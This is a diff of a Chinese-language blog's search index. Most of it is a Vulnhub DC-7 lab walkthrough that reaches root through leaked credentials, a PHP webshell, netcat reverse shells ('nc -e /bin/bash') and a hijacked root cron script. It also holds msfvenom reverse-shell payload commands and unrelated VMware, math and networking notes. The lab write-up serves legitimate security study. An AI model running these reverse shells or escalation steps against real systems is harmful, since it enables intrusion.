-<h2 id="3、仅主机模式（Host-Only）"><a href="#3、仅主机模式（Host-Only）" class="headerlink" title="3、仅主机模式（Host-Only）"></a>3、仅主机模式（Host-Only）</h2><p>该模式其实就是 NAT 模式去除虚拟 NAT 设备，然后使用 VMware NetworkAdepter VMnet1 虚拟网卡与 VMnet1 虚拟交换机进行连接来与虚拟机通信，仅主机模式模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。</p>
-<p><img src="/2022/10/07/VMnet/5.png" alt></p>
-]]></content>
-      <categories>
-        <category>基础知识和笔记</category>
-      </categories>
-      <tags>
-        <tag>VMware</tag>
-        <tag>learn</tag>
       </tags>
   </entry>
   <entry>
@@ -318,8 +522,8 @@
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>靶机</tag>
         <tag>渗透测试</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -475,8 +679,8 @@
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>靶机</tag>
         <tag>渗透测试</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -638,8 +842,8 @@
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>靶机</tag>
         <tag>渗透测试</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -771,8 +975,8 @@
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>靶机</tag>
         <tag>渗透测试</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -896,8 +1100,130 @@
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>靶机</tag>
         <tag>渗透测试</tag>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulnhub-DC-7渗透学习</title>
+    <url>/2022/08/14/Vulnhub-DC-7/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.11.132</p>
+<p>靶机：Vulnhub-DC-7：192.168.11.141</p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.1-255</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/1.png" alt></p>
+<p>扫描目标端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.141</span><br></pre></td></tr></table></figure>
+<p>同时也知道了这个网站的CMS是<code>Drupal 8</code></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/2.png" alt></p>
+<p>既然知道了CMS，那就去看看有没有什么漏洞可以利用</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit drupal 8</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/3.png" alt></p>
+<p>我尝试了几个，但都没有什么结果</p>
+<p>接着我又用<code>msf</code>尝试一下</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/4.png" alt></p>
+<p>但也是一样的结果，没有什么利用的上的</p>
+<p>那就说明这个靶机不是按照正常套路来的，那就直接访问一下看看，访问之后发现有作者给出的线索</p>
+<blockquote>
+<p>DC-7 引入了一些“新”概念，但我会让你弄清楚它们是什么。 :-)</p>
+<p>虽然这个挑战并不完全是技术性的，但如果您需要诉诸暴力破解或字典攻击，您可能不会成功。</p>
+<p>你要做的，就是跳出框框思考。</p>
+<p>方式“外”框。 :-)</p>
+</blockquote>
+<p>作者告诉我们思维不要被限制，那就来看看这个网站的特点吧</p>
+<p>在这个页面的footer也就是页脚处发现一个看起来并不正常的东西</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/5.png" alt></p>
+<p>直接复制去必应搜索一下，搜索后发现有个Github账号</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/6.png" alt></p>
+<p>进入后发现他有个项目：<code>staffdb</code></p>
+<p>进入这个项目中，在<code>config.php</code>中发现了一个账户和密码</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/7.png" alt></p>
+<blockquote>
+<p>dc7user / MdR3xOgB7#dW</p>
+</blockquote>
+<p>尝试登录网站后台，但是无论尝试几次，依然是错误的</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/8.png" alt></p>
+<p>难道这个是靶场的账号密码吗，想起刚刚开放了22端口，尝试ssh登录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh dc7user@192.168.11.141</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/9.png" alt></p>
+<p>成功登录</p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先尝试SUID和有无免密的root权限命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/10.png" alt></p>
+<p>但都没有利用点</p>
+<p>那就随便寻找一下有用的信息吧</p>
+<p>然后在用户<code>dc7user</code>目录中发现<code>backups</code>目录和<code>mbox</code>文件，先进入backups，发现都是<code>gpg</code>文件<em>（靶机里是没有html目录的，为什么会有html目录，后面我会提）</em>，<code>gpg</code>文件是一种加密格式，直接打开的话是一串乱码，而且解密还需要密钥，因此暂时没什么帮助</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/11.png" alt></p>
+<p>那就看一下旁边的<code>mbox</code>文件，打开后发现这似乎是管理员（root）的计划任务，会在一定时间后自动执行<code>/opt/scripts/backups.sh</code>文件，还是以root的权限运行</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/12.png" alt></p>
+<p>那么思路就清楚了，如果我们可以对这个脚本文件有修改的权限，那么就可以写入反弹root权限shell的内容了，就能得到root权限了</p>
+<p>那么就查看一下这个文件的权限吧</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/13.png" alt></p>
+<p>可以看到我们当前用户并不能对其写入内容，但还是看一下这个文件里有什么内容吧</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/14.png" alt></p>
+<p>大部分命令都能够明白，其中有两个命令值得注意:<code>drush</code>和<code>gpg</code>，很明显，这个加密的密钥已经能看到了，就是<code>PickYourOwnPassword</code></p>
+<blockquote>
+<p>然后我回去尝试对其解密，解密成功后将其解压，解压出来后发现就是一个<code>html</code>的文件夹，里面并没什么有用的内容，也许是网站站点的一些源码吧</p>
+</blockquote>
+<p>无果后回来研究这个<code>drush</code>命令，发现这个命令是<code>drupal</code>用来管理数据库的</p>
+<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令</a></p>
+<p>然后还发现这个命令可以修改密码</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/15.png" alt></p>
+<p>那我们就跟着这个脚本文件来到<code>/var/www/html/</code>目录，然后修改密码，第一次尝试修改root用户的密码，发现并不能修改，那就修改默认用户admin的密码试试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">drush upwd admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/16.png" alt></p>
+<p>成功修改admin用户密码，后台尝试登录成功</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/17.png" alt></p>
+<p>然后在网站中寻找信息，发现在<code>Content → Add content → Basic page</code>中似乎可以写码，但并没有php的选项</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/18.png" alt></p>
+<p>然后去网上搜索相关信息“drupal 8 PHP”，在drupal官方中找到了解释：<a href="https://www.drupal.org/node/2088811">PHP Filter module removed from Drupal core</a></p>
+<blockquote>
+<p>PHP Filter模块已从Drupal Core中删除，并移至 <a href="http://drupal.org/project/php">http://drupal.org/project/php</a> 的一个贡献模块</p>
+</blockquote>
+<p>原来是官方出于安全考虑，将PHP Filter模块移除，但可以作为一个模块（module）手动安装</p>
+<p>那就跟着官方给的方法，将PHP模块下载下来</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/19.png" alt></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/20.png" alt></p>
+<p>然后回到网站进行安装：<code>Extend → Install new module</code></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/21.png" alt></p>
+<p>安装完成后点击启用</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/22.png" alt></p>
+<p>按提示成功启用<code>PHP Filter</code>模块后回到刚刚写码的地方，Text format选择<code>PHP code</code>，然后写入一句话即可</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/23.png" alt></p>
+<p>然后复制链接地址，打开蚁剑进行连接</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/24.png" alt></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/25.png" alt></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>连接成功后进入虚拟终端反弹shell</p>
+<p>kali：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+<p>蚁剑虚拟终端：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.11.132 2222</span><br></pre></td></tr></table></figure>
+<p>改为交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/26.png" alt></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然后就是写入反弹shell代码进入<code>backups.sh</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.11.132 3333&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/27.png" alt></p>
+<p>然后在kali中监听</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>
+<p>然后就是等待这个计划任务的进行，因为执行这个脚本文件的权限是root权限，那么反弹回来的权限自然也是root权限</p>
+<p>成功连接后就能找到flag</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/28.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123683318?spm=1001.2014.3001.5502">dc-7 靶机渗透学习</a></p>
+<p><a href="https://blog.csdn.net/weixin_44214107/article/details/101123371">DC：7靶机-Walkthrough</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令 - 知乎 (zhihu.com)</a></p>
+<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">使用 GPG 加密和解密文件 | 《Linux就该这么学》 (linuxprobe.com)</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>渗透测试</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -1027,130 +1353,22 @@
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>靶机</tag>
         <tag>渗透测试</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
   <entry>
-    <title>Vulnhub-DC-7渗透学习</title>
-    <url>/2022/08/14/Vulnhub-DC-7/</url>
-    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
-<p>攻击机：Kali-2021.3：192.168.11.132</p>
-<p>靶机：Vulnhub-DC-7：192.168.11.141</p>
-</blockquote>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.1-255</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/1.png" alt></p>
-<p>扫描目标端口</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.141</span><br></pre></td></tr></table></figure>
-<p>同时也知道了这个网站的CMS是<code>Drupal 8</code></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/2.png" alt></p>
-<p>既然知道了CMS，那就去看看有没有什么漏洞可以利用</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit drupal 8</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/3.png" alt></p>
-<p>我尝试了几个，但都没有什么结果</p>
-<p>接着我又用<code>msf</code>尝试一下</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/4.png" alt></p>
-<p>但也是一样的结果，没有什么利用的上的</p>
-<p>那就说明这个靶机不是按照正常套路来的，那就直接访问一下看看，访问之后发现有作者给出的线索</p>
-<blockquote>
-<p>DC-7 引入了一些“新”概念，但我会让你弄清楚它们是什么。 :-)</p>
-<p>虽然这个挑战并不完全是技术性的，但如果您需要诉诸暴力破解或字典攻击，您可能不会成功。</p>
-<p>你要做的，就是跳出框框思考。</p>
-<p>方式“外”框。 :-)</p>
-</blockquote>
-<p>作者告诉我们思维不要被限制，那就来看看这个网站的特点吧</p>
-<p>在这个页面的footer也就是页脚处发现一个看起来并不正常的东西</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/5.png" alt></p>
-<p>直接复制去必应搜索一下，搜索后发现有个Github账号</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/6.png" alt></p>
-<p>进入后发现他有个项目：<code>staffdb</code></p>
-<p>进入这个项目中，在<code>config.php</code>中发现了一个账户和密码</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/7.png" alt></p>
-<blockquote>
-<p>dc7user / MdR3xOgB7#dW</p>
-</blockquote>
-<p>尝试登录网站后台，但是无论尝试几次，依然是错误的</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/8.png" alt></p>
-<p>难道这个是靶场的账号密码吗，想起刚刚开放了22端口，尝试ssh登录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh dc7user@192.168.11.141</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/9.png" alt></p>
-<p>成功登录</p>
-<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先尝试SUID和有无免密的root权限命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/10.png" alt></p>
-<p>但都没有利用点</p>
-<p>那就随便寻找一下有用的信息吧</p>
-<p>然后在用户<code>dc7user</code>目录中发现<code>backups</code>目录和<code>mbox</code>文件，先进入backups，发现都是<code>gpg</code>文件<em>（靶机里是没有html目录的，为什么会有html目录，后面我会提）</em>，<code>gpg</code>文件是一种加密格式，直接打开的话是一串乱码，而且解密还需要密钥，因此暂时没什么帮助</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/11.png" alt></p>
-<p>那就看一下旁边的<code>mbox</code>文件，打开后发现这似乎是管理员（root）的计划任务，会在一定时间后自动执行<code>/opt/scripts/backups.sh</code>文件，还是以root的权限运行</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/12.png" alt></p>
-<p>那么思路就清楚了，如果我们可以对这个脚本文件有修改的权限，那么就可以写入反弹root权限shell的内容了，就能得到root权限了</p>
-<p>那么就查看一下这个文件的权限吧</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/13.png" alt></p>
-<p>可以看到我们当前用户并不能对其写入内容，但还是看一下这个文件里有什么内容吧</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/14.png" alt></p>
-<p>大部分命令都能够明白，其中有两个命令值得注意:<code>drush</code>和<code>gpg</code>，很明显，这个加密的密钥已经能看到了，就是<code>PickYourOwnPassword</code></p>
-<blockquote>
-<p>然后我回去尝试对其解密，解密成功后将其解压，解压出来后发现就是一个<code>html</code>的文件夹，里面并没什么有用的内容，也许是网站站点的一些源码吧</p>
-</blockquote>
-<p>无果后回来研究这个<code>drush</code>命令，发现这个命令是<code>drupal</code>用来管理数据库的</p>
-<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令</a></p>
-<p>然后还发现这个命令可以修改密码</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/15.png" alt></p>
-<p>那我们就跟着这个脚本文件来到<code>/var/www/html/</code>目录，然后修改密码，第一次尝试修改root用户的密码，发现并不能修改，那就修改默认用户admin的密码试试</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">drush upwd admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/16.png" alt></p>
-<p>成功修改admin用户密码，后台尝试登录成功</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/17.png" alt></p>
-<p>然后在网站中寻找信息，发现在<code>Content → Add content → Basic page</code>中似乎可以写码，但并没有php的选项</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/18.png" alt></p>
-<p>然后去网上搜索相关信息“drupal 8 PHP”，在drupal官方中找到了解释：<a href="https://www.drupal.org/node/2088811">PHP Filter module removed from Drupal core</a></p>
-<blockquote>
-<p>PHP Filter模块已从Drupal Core中删除，并移至 <a href="http://drupal.org/project/php">http://drupal.org/project/php</a> 的一个贡献模块</p>
-</blockquote>
-<p>原来是官方出于安全考虑，将PHP Filter模块移除，但可以作为一个模块（module）手动安装</p>
-<p>那就跟着官方给的方法，将PHP模块下载下来</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/19.png" alt></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/20.png" alt></p>
-<p>然后回到网站进行安装：<code>Extend → Install new module</code></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/21.png" alt></p>
-<p>安装完成后点击启用</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/22.png" alt></p>
-<p>按提示成功启用<code>PHP Filter</code>模块后回到刚刚写码的地方，Text format选择<code>PHP code</code>，然后写入一句话即可</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/23.png" alt></p>
-<p>然后复制链接地址，打开蚁剑进行连接</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/24.png" alt></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/25.png" alt></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>连接成功后进入虚拟终端反弹shell</p>
-<p>kali：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<p>蚁剑虚拟终端：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.11.132 2222</span><br></pre></td></tr></table></figure>
-<p>改为交互式shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/26.png" alt></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然后就是写入反弹shell代码进入<code>backups.sh</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.11.132 3333&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/27.png" alt></p>
-<p>然后在kali中监听</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>
-<p>然后就是等待这个计划任务的进行，因为执行这个脚本文件的权限是root权限，那么反弹回来的权限自然也是root权限</p>
-<p>成功连接后就能找到flag</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/28.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123683318?spm=1001.2014.3001.5502">dc-7 靶机渗透学习</a></p>
-<p><a href="https://blog.csdn.net/weixin_44214107/article/details/101123371">DC：7靶机-Walkthrough</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令 - 知乎 (zhihu.com)</a></p>
-<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">使用 GPG 加密和解密文件 | 《Linux就该这么学》 (linuxprobe.com)</a></p>
-]]></content>
+    <title>求斜渐近线</title>
+    <url>/2022/01/10/math/</url>
+    <content><![CDATA[<script type="math/tex; mode=display">
+如果\lim\limits_{n \to \infty} [f(x)-kx-b]=0，则y=kx+b是曲线的斜渐近线</script><hr>
+<script type="math/tex; mode=display">
+求法：\lim\limits_{n \to \infty} \cfrac{f(x)}{x} = k，且\lim\limits_{n \to \infty} f(x)-kx=b，斜渐近线为y=kx+b</script>]]></content>
       <categories>
-        <category>靶场&amp;靶机</category>
+        <category>高数笔记</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>靶机</tag>
-        <tag>渗透测试</tag>
+        <tag>math</tag>
       </tags>
   </entry>
   <entry>
@@ -1700,20 +1918,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>求斜渐近线</title>
-    <url>/2022/01/10/math/</url>
-    <content><![CDATA[<script type="math/tex; mode=display">
-如果\lim\limits_{n \to \infty} [f(x)-kx-b]=0，则y=kx+b是曲线的斜渐近线</script><hr>
-<script type="math/tex; mode=display">
-求法：\lim\limits_{n \to \infty} \cfrac{f(x)}{x} = k，且\lim\limits_{n \to \infty} f(x)-kx=b，斜渐近线为y=kx+b</script>]]></content>
-      <categories>
-        <category>高数笔记</category>
-      </categories>
-      <tags>
-        <tag>math</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>metasploit</title>
     <url>/2022/04/24/metasploit/</url>
     <content><![CDATA[<h1 id="一、metasploit框架介绍"><a href="#一、metasploit框架介绍" class="headerlink" title="一、metasploit框架介绍"></a>一、metasploit框架介绍</h1><blockquote>
@@ -1800,14 +2004,14 @@
 </blockquote>
 <h3 id="1-msfvenom生成可执行程序payload"><a href="#1-msfvenom生成可执行程序payload" class="headerlink" title="(1)msfvenom生成可执行程序payload"></a>(1)msfvenom生成可执行程序payload</h3><ul>
 <li><p>Linux：</p>
-<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= &lt;Your IP Address&gt; IPORT= &lt;Your Port to Connect On&gt; -f elf -o /root/Desktop/shell.elf</code></p>
-<p><code>msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT= &lt;Your Port to ConnectOn&gt; -f elf -o /root/Desktop/shell.elf</code></p>
+<p>反向连接：<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f elf -o /root/Desktop/shell.elf</code></p>
+<p>正向连接：<code>msfvenom -p linux/x86/meterpreter/bind_tcp LPORT= &lt;Your Port to ConnectOn&gt; -f elf -o /root/Desktop/shell.elf</code></p>
 </li>
 <li><p>Windows：</p>
-<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f exe -o /root/Desktop/shell.exe</code></p>
+<p>反向连接：<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f exe -o /root/Desktop/shell.exe</code></p>
 </li>
 <li><p>Mac：</p>
-<p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f macho -o /root/Desktop/shell.macho</code></p>
+<p>反向连接：<code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f macho -o /root/Desktop/shell.macho</code></p>
 </li>
 </ul>
 <h3 id="2-msfvenom生成web-payload"><a href="#2-msfvenom生成web-payload" class="headerlink" title="(2)msfvenom生成web payload"></a>(2)msfvenom生成web payload</h3><ul>
@@ -1823,6 +2027,48 @@
       <tags>
         <tag>web</tag>
         <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（3）</title>
+    <url>/2022/01/22/read-1-3/</url>
+    <content><![CDATA[<h1 id="0x03-网络核心"><a href="#0x03-网络核心" class="headerlink" title="0x03 网络核心"></a>0x03 网络核心</h1><p>通过网络链路和交换机移动数据有两种方法：<strong>分组交换</strong>（packet switching）和<strong>电路交换</strong>（circuit switching）</p>
+<h2 id="一、分组交换"><a href="#一、分组交换" class="headerlink" title="一、分组交换"></a>一、分组交换</h2><ul>
+<li>为了从源端系统向目的端系统发送一个<strong>报文</strong>（message），源将长报文划分为较小的数据块，称之为<strong>分组</strong>（packet）</li>
+<li>在源和目的地之间，每个分组都通过通信链路和<strong>分组交换机</strong>（packet switch）传送。（交换机主要有两类：<strong>路由器</strong>（router）和<strong>链路层交换机</strong>（link-layer switch））</li>
+</ul>
+<h3 id="3-1-存储转发传输"><a href="#3-1-存储转发传输" class="headerlink" title="3.1 存储转发传输"></a>3.1 存储转发传输</h3><ul>
+<li>多数分组交换机在链路的输入端使用<strong>存储转发传输</strong>（store-and-forward transmission）机制</li>
+<li>存储转发传输是指在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组</li>
+</ul>
+<h3 id="3-2-排队时延和分组丢失"><a href="#3-2-排队时延和分组丢失" class="headerlink" title="3.2 排队时延和分组丢失"></a>3.2 排队时延和分组丢失</h3><ul>
+<li>每台分组交换机有多条链路与之相连，对于每条相连的链路，该分组交换机具有一个<strong>输出缓存</strong>（output buffer），它用于存储路由器准备发往那条链路的分组</li>
+<li>如果到达的分组需要传输到某条链路，但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，这时就会出现<strong>排队时延</strong>（queuing delay）</li>
+<li>因为缓存空间的大小是有限的，一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。此时，将出现<strong>分组丢失（丢包）</strong>（packet loss），到达的分组或已经排队的分组之一将被丢弃</li>
+</ul>
+<h3 id="3-3-转发表和路由选择协议"><a href="#3-3-转发表和路由选择协议" class="headerlink" title="3.3 转发表和路由选择协议"></a>3.3 转发表和路由选择协议</h3><ul>
+<li>每台路由器具有一个<strong>转发表</strong>（forwarding table），用于将目的地址（或目的地址的一部分）映射称为输出链路</li>
+<li>当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发现适当的出链路。路由器则将分组导向该出链路</li>
+<li>因特网具有一些特殊的<strong>路由选择协议</strong>（routing protocol），用于自动地设置这些转发表</li>
+</ul>
+<h2 id="二、电路交换"><a href="#二、电路交换" class="headerlink" title="二、电路交换"></a>二、电路交换</h2><ul>
+<li><p>在电路交换网络中，端系统间通信会话期间，预留了端系统间沿路径通信所需要的资源（缓存，链路传输速率）。而在分组交换网络中，这些资源则不是预留的</p>
+</li>
+<li><p>当两台主机要通信时，该网络在两台主机之间创建一条专用的<strong>端到端连接</strong>（end-to-end connection）</p>
+</li>
+<li><p>如图1-13，这条专用的端到端连接使用第一条链路中的第二条电路喝第二条链路中的第四条电路</p>
+<p><img src="/2022/01/22/read-1-3/1.png" alt></p>
+</li>
+<li><p>因为每条链路具有4条电路，对于由端到端连接所使用的每条链路而言，该连接在连接期间获得链路总传输总量的$\frac{1}{4}$。例如，如果两台邻近交换机之间每条链路具有1Mbps传输速率，则每个端到端电路交换连接获得250kbps专用的传输速率</p>
+</li>
+</ul>
+<h2 id="三、网络的网络"><a href="#三、网络的网络" class="headerlink" title="三、网络的网络"></a>三、网络的网络</h2>]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+        <tag>read</tag>
       </tags>
   </entry>
   <entry>
@@ -2151,142 +2397,6 @@
       </tags>
   </entry>
   <entry>
-    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（3）</title>
-    <url>/2022/01/22/read-1-3/</url>
-    <content><![CDATA[<h1 id="0x03-网络核心"><a href="#0x03-网络核心" class="headerlink" title="0x03 网络核心"></a>0x03 网络核心</h1><p>通过网络链路和交换机移动数据有两种方法：<strong>分组交换</strong>（packet switching）和<strong>电路交换</strong>（circuit switching）</p>
-<h2 id="一、分组交换"><a href="#一、分组交换" class="headerlink" title="一、分组交换"></a>一、分组交换</h2><ul>
-<li>为了从源端系统向目的端系统发送一个<strong>报文</strong>（message），源将长报文划分为较小的数据块，称之为<strong>分组</strong>（packet）</li>
